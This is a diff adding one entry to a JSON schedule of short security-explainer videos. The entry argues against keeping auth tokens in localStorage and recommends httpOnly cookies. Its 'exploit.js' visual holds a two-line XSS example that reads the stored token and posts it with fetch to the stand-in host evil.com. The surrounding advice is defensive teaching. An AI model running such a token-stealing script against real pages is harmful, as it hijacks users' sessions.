@@ -852,5 +852,126 @@
     ],
     "slot": 3,
     "seconds": 21.1
+  },
+  {
+    "id": 39,
+    "style": "dark",
+    "kicker": "Explained #1",
+    "hook": "Is storing your *login token* in localStorage safe?",
+    "points": [
+      {
+        "title": "Feels secure",
+        "body": "Just your own code touching it",
+        "visual": [
+          {
+            "type": "code",
+            "title": "auth.ts",
+            "language": "ts",
+            "code": "function saveToken(token: string) {\n  localStorage.setItem(\"token\", token);\n}",
+            "highlight": [
+              2
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Any script reads it",
+        "body": "One xss bug leaks everything",
+        "visual": [
+          {
+            "type": "diagram",
+            "nodes": [
+              {
+                "id": "app",
+                "label": "Your App",
+                "kind": "client"
+              },
+              {
+                "id": "store",
+                "label": "localStorage",
+                "kind": "cache"
+              },
+              {
+                "id": "xss",
+                "label": "XSS Script",
+                "kind": "cloud"
+              }
+            ],
+            "edges": [
+              {
+                "from": "app",
+                "to": "store"
+              },
+              {
+                "from": "xss",
+                "to": "store"
+              }
+            ],
+            "flow": [
+              "xss>store",
+              "store>xss"
+            ]
+          },
+          {
+            "type": "code",
+            "title": "exploit.js",
+            "language": "js",
+            "code": "const t = localStorage.getItem('tok');\nfetch('https://evil.com', {body: t});",
+            "highlight": [
+              1,
+              2
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Use httpOnly cookies",
+        "body": "JavaScript cannot read those cookies",
+        "visual": [
+          {
+            "type": "diff",
+            "title": "server.js",
+            "language": "js",
+            "before": "res.cookie(\"token\", token);",
+            "after": "res.cookie(\"token\", token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: \"strict\"\n});"
+          }
+        ]
+      }
+    ],
+    "cta": "Comment *TOKENS* for the safer setup.",
+    "dm_keyword": "TOKENS",
+    "dm_guide": "Skip localStorage for auth tokens, any XSS bug can read it instantly. Use an httpOnly cookie instead. Server side, set it like this: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/. That header blocks JavaScript from ever touching the cookie. Pair it with a short expiry and refresh token rotation, and keep SameSite set to Strict or Lax to help with CSRF too. Docs: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies and https://owasp.org/www-community/HttpOnly",
+    "caption": "localStorage vs httpOnly cookies for auth tokens\nOne XSS bug can leak everything sitting in localStorage\nWhere do you store your tokens? 👇",
+    "hashtags": [
+      "#webdev",
+      "#xss",
+      "#javascript",
+      "#websecurity"
+    ],
+    "voiceover": [
+      "[urgent] Quick question, is your login token sitting in localStorage?",
+      "[knowing] It looks harmless since nothing else seems to touch it.",
+      "[serious, fast] But one xss bug lets any script read it.",
+      "[confident and fast] Httponly cookies fix that, javascript simply cannot touch them.",
+      "[warm, curious] Comment tokens and I will send you the safer setup."
+    ],
+    "test": {
+      "name": "hook_style",
+      "arm": "question"
+    },
+    "pillar": "concept",
+    "series": "Explained",
+    "episode": 1,
+    "posted_at": "2026-09-30T12:01:06+00:00",
+    "media_id": "18118775302941558",
+    "shown": [
+      "text",
+      "code",
+      "diagram",
+      "diff",
+      "text"
+    ],
+    "slot": 1,
+    "seconds": 19.3
   }
 ]
